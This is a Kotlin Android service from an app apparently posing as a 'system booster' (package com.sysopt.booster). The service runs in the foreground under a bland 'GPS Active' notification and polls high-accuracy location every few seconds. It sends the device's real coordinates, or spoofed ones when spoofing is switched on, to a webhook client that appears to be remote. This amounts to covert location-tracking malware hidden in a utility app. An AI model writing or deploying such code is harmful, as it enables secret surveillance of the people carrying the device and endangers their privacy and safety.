package com.sysopt.booster

import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.google.android.gms.location.*

class GPSSpoofService : Service() {
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private val handler = Handler(Looper.getMainLooper())
    private var isSpoofing = false
    private var targetLat = 0.0
    private var targetLng = 0.0
    private var realLocation: Location? = null

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        setupLocationCallback()
        startForeground(2008, NotificationHelper.createNotification(this, "GPS Active"))
        startLocationUpdates()
    }

    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                val locations = locationResult.locations
                if (locations.isNullOrEmpty()) return

                val last = locations.lastOrNull() ?: return
                realLocation = last

                if (isSpoofing) {
                    // Broadcast spoofed location
                    val spoofed = Location("gps").apply {
                        latitude = targetLat
                        longitude = targetLng
                        accuracy = 10.0f
                        time = System.currentTimeMillis()
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            elapsedRealtimeNanos = System.nanoTime()
                        }
                    }
                    WebhookClient.sendLocation(spoofed.latitude, spoofed.longitude, "spoofed")
                    sendLocationBroadcast(spoofed)
                } else {
                    // Send real location
                    WebhookClient.sendLocation(last.latitude, last.longitude, "real")
                    sendLocationBroadcast(last)
                }
            }
        }
    }

    fun startSpoofing(lat: Double, lng: Double) {
        targetLat = lat
        targetLng = lng
        isSpoofing = true
    }

    fun stopSpoofing() {
        isSpoofing = false
    }

    private fun startLocationUpdates() {
        val locationRequest = LocationRequest.create().apply {
            interval = 5000
            fastestInterval = 2000
            priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        }

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )
        } catch (e: SecurityException) {
            // Permission denied
        }
    }

    private fun sendLocationBroadcast(location: Location) {
        val intent = Intent("com.sysopt.booster.GPS_UPDATE")
        intent.putExtra("latitude", location.latitude)
        intent.putExtra("longitude", location.longitude)
        intent.putExtra("accuracy", location.accuracy)
        sendBroadcast(intent)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try {
            fusedLocationClient.removeLocationUpdates(locationCallback)
        } catch (e: Exception) {}
        super.onDestroy()
    }
}